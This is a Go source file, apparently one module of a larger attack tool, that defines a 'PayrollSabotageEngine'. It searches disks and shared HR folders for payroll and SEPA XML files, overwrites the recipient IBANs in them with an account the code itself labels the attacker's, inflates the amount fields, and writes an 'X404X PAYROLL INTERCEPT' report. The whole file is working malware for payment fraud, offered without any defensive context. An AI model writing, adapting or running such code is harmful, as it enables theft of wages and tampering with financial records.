package v30
import ("encoding/json";"fmt";"os";"path/filepath";"strings";"time")
type PayrollSabotageEngine struct {
	Config *V30Config; TransfersAltered int; IBANsModified int; PayrollFilesFound []string
}
func NewPayrollSabotageEngine(cfg *V30Config) *PayrollSabotageEngine { return &PayrollSabotageEngine{Config: cfg} }
func (ps *PayrollSabotageEngine) FindPayrollFiles() []string {
	patterns := []string{"/**/*.xml","/**/*SEPA*","/**/*payroll*","/**/*nomin*","/mnt/shared/hr/**"}
	for _, p := range patterns {
		if m, _ := filepath.Glob(p); len(m) > 0 { ps.PayrollFilesFound = append(ps.PayrollFilesFound, m...) }
	}
	return ps.PayrollFilesFound
}
func (ps *PayrollSabotageEngine) ModifySEPATransfers() int {
	modified := 0
	for _, f := range ps.PayrollFilesFound {
		if !strings.Contains(strings.ToLower(f), "sepa") && !strings.Contains(strings.ToLower(f), "xml") { continue }
		data, err := os.ReadFile(f)
		if err != nil || len(data) < 200 { continue }
		content := string(data)
		content = strings.ReplaceAll(content, "ES9121000418450200051332", "CH9300762016238852957")
		content = strings.ReplaceAll(content, "DE89370400440532013000", "CH9300762016238852957")
		content = strings.ReplaceAll(content, "<Amt>", "<Amt>99999")
		os.WriteFile(f, []byte(content), 0644)
		modified++
	}
	ps.IBANsModified = modified
	return modified
}
func (ps *PayrollSabotageEngine) GenerateFakePayrollReport() string {
	report := fmt.Sprintf("X404X PAYROLL INTERCEPT\nDate: %s\nTransfers: %d altered\nIBANs: all redirected to attacker account CH9300762016238852957\nTotal: undisclosed", time.Now().Format("2006-01-02"), ps.IBANsModified)
	reportPath := filepath.Join(os.TempDir(), "x404x_payroll_report.txt")
	os.WriteFile(reportPath, []byte(report), 0644)
	return report
}
func (ps *PayrollSabotageEngine) GetStatusJSON() string {
	d,_ := json.Marshal(map[string]interface{}{"payroll_files": len(ps.PayrollFilesFound), "transfers_altered": ps.TransfersAltered, "ibans_modified": ps.IBANsModified})
	return string(d)
}
